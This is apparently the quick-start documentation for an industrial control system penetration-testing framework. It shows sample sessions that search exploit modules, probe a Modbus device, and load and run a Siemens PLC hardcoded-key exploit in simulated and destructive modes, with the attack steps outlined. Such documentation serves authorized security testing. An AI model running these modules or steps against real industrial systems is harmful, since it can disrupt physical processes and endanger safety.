# Quick Start

This guide walks through a complete IXF session from launch to the first real exploit run, covering simulation mode, module loading, option setting, and the SafeMode/DestructiveMode gate.

---

## Step 1: Launch IXF

```
$ ixf
[*] Indexing modules…
[+] 976 modules indexed.

  ___           _           _       _  __  ______  _       ______
 |_ _|_ __   __| |_   _ ___| |_ _ __(_) \ \/ / _ \| |     |  ___|__  _ __ __ _  ___
  | || '_ \ / _` | | | / __| __| '__| |  \  /|  __/| |     | |_ / _ \| '__/ _` |/ _ \
  | || | | | (_| | |_| \__ \ |_| |  | |  /  \| |   | |___  |  _| (_) | | | (_| |  __/
 |___|_| |_|\__,_|\__,_|___/\__|_|  |_| /_/\_\_|   |_____| |_|  \___/|_|  \__, |\___|
                                                                              |___/
  IndustrialXPL-Forge v1.0.12 — OT/ICS/SCADA Security Assessment Framework
  Author: André Henrique (@mrhenrike) | União Geek | https://uniaogeek.com.br/
  Python-First. Pure Python — install with pip install industrialxpl-forge.
  Type 'help' for commands.  simulate=True by default (safe mode).

ixf >
```

---

## Step 2: Search for Modules

Use `search` to find modules by keyword, vendor, CVE ID, or protocol:

```
ixf > search modbus
[*] Search results for: modbus
    use exploits/protocols/modbus/modbus_client
    use exploits/protocols/modbus/modbus_replay_attack
    use exploits/protocols/modbus/modbus_unauthorized_coil_set
    use exploits/protocols/modbus/modbus_write_coil_flood
    use scanners/ics/modbus_detect
    use scanners/ics/modbus_scanner
    ... (50 results)

ixf > search CVE-2021-22681
[*] Search results for: CVE-2021-22681
    use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key

ixf > search siemens
[*] Search results for: siemens
    use cve/siemens/cve_2015_2177_s7_300_s7comm_dos
    use cve/siemens/cve_2019_13946_s7_profinet_dos
    use cve/siemens/cve_2020_15782_s7_memory_bypass
    ... (77 results)
```

---

## Step 3: Load a Module

```
ixf > use scanners/ics/modbus_detect
[*] Module loaded: Modbus TCP Device Detect
[*] CVE: N/A | CVSS: N/A | Impact: LOW

ixf (Modbus TCP Device Detect) >
```

The prompt changes to show the loaded module name.

---

## Step 4: View Module Options

```
ixf (Modbus TCP Device Detect) > show options

     Options — Modbus TCP Device Detect
+------------+-----------+----------+---------------------------------------+
| Option     | Value     | Required | Description                           |
|------------+-----------+----------+---------------------------------------|
| target     |           | yes      | Target IP or hostname                 |
| port       | 502       | no       | Modbus TCP port (default: 502)        |
| unit_id    | 1         | no       | Modbus unit ID (1-247)                |
| timeout    | 5         | no       | Connection timeout (seconds)          |
| simulate   | True      | no       | Simulate mode (default: True)         |
| destructive| False     | no       | Enable live packet send               |
+------------+-----------+----------+---------------------------------------+
```

View full module info (CVE, MITRE techniques, references):

```
ixf (Modbus TCP Device Detect) > show info

  Module Information
  ─────────────────────────────────────────
  name            : Modbus TCP Device Detect
  description     : Detect Modbus TCP-speaking devices via function code 4
  authors         : ('Andre Henrique (mrhenrike)',)
  impact          : LOW
  exploit_type    : Service Detection
  cve             : N/A
  mitre_techniques: ['T0888', 'T0802']
  mitre_tactics   : ['Discovery']
```

---

## Step 5: Set a Target

```
ixf (Modbus TCP Device Detect) > set target 192.168.1.100
[*] target => 192.168.1.100

ixf (Modbus TCP Device Detect) > set port 502
[*] port => 502
```

---

## Step 6: Run in Simulate Mode (Default — Safe)

With `simulate=True` (default), `run` prints exactly what the module *would* do without sending any packets:

```
ixf (Modbus TCP Device Detect) > run

  [SIMULATE MODE — no packets sent]
  ─────────────────────────────────────────────────────────────
  [i] What would happen:
      Send Modbus Function Code 4 (Read Input Registers) to 192.168.1.100:502
      Payload (hex): 00 01 00 00 00 06 01 04 00 00 00 01
      Check Transaction ID echo to confirm Modbus device presence.

  [i] MITRE ATT&CK for ICS: T0888 (Remote System Discovery)
  [i] To run live: set simulate false
```

---

## Step 7: Run a Connectivity Check

`check` performs a read-only TCP probe regardless of simulate mode:

```
ixf (Modbus TCP Device Detect) > check
[*] Checking 192.168.1.100:502...
[+] VULNERABLE — Modbus device detected (Transaction ID echo confirmed)
```

---

## Step 8: Load a CVE Exploit

```
ixf (Modbus TCP Device Detect) > back
ixf > use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key

[*] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 192.168.1.50
[*] target => 192.168.1.50

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run

  [SIMULATE MODE — no packets sent]
  ─────────────────────────────────────────────────────────────
  CVE-2021-22681 Siemens S7-1200/1500 PLC
  CVSS 9.8 (CRITICAL) | Hardcoded TLS private key — S7comm+ MitM/Decryption

  Step 1: Extract hardcoded private key from S7-1200 firmware (public CVE-2021-22681 key)
  Step 2: Perform MitM on S7comm+ TCP/102
  Step 3: Decrypt all S7comm+ traffic with extracted key
  Step 4: Forge authenticated commands to read/write PLC memory

  [i] Affected: S7-1200/1500 all versions using S7comm+
  [i] PoC reference: https://cert-portal.siemens.com/productcert/pdf/ssa-568427.pdf
  [i] MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message), T0830 (Man in the Middle)
  [i] To run live: set simulate false + set destructive true
```

---

## Step 9: Run Live (Authorized Labs Only)

> **Warning:** Only run live against systems you own or have explicit written authorization to test.

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set simulate false
[*] simulate => False

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set destructive true
[*] destructive => True

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run

  ██████████████████████████████████████████████████████████████
  ██  DESTRUCTIVE MODE — CRITICAL IMPACT                       ██
  ██████████████████████████████████████████████████████████████

  Module:  CVE-2021-22681 Siemens S7-1200/1500 PLC
  Target:  192.168.1.50:102
  Impact:  CRITICAL — Firmware modification / safety bypass. MAY BE IRREVERSIBLE.
  Action:  Hardcoded TLS key extraction and S7comm+ traffic decryption

  Type the following string exactly to confirm:
  I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION

  Confirmation> I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION
[+] Confirmed. Executing...
[*] [CVE-2021-22681] Connecting to 192.168.1.50:102...
```

All destructive operations are recorded in `.log/destructive_ops_YYYY-MM-DD.log`.

---

## MITRE ATT&CK Quick Start

Run a technique sweep without loading individual modules:

```
ixf > ttp T0843 192.168.1.100
[*] Sweeping T0843 (Program Download) against 192.168.1.100...
[*] Running: cve.siemens.cve_2022_1161_controllogix_modified_fw (simulate)
[*] Running: cve.rockwell.cve_2022_1161_controllogix_modified_fw (simulate)
...
[+] Sweep complete: 12 modules run, 3 potential matches

ixf > mitre-coverage
  MITRE ATT&CK for ICS Coverage
  ────────────────────────────────────────────────────────
  Initial Access (TA0108)         : 9/9   (100%)
  Execution (TA0104)              : 8/9   (88%)
  Persistence (TA0110)            : 6/8   (75%)
  ...
  TOTAL                           : 74/90 (82%)
```

---

## Non-Interactive Quick Start

Run a single command without entering the interactive shell:

```bash
# Load module, set target, run (simulate)
ixf use scanners/ics/modbus_detect set target 192.168.1.100 run

# Search and exit
ixf search CVE-2015-5374

# Generate report
ixf report json
```

---

## Diagnostics

```bash
python tools/env_doctor.py
```

This checks Python version, all required and optional dependencies, external runtimes, and module index integrity.

---

*Previous: [Installation](01-installation.md) | Next: [Shell Reference](03-shell-reference.md)*
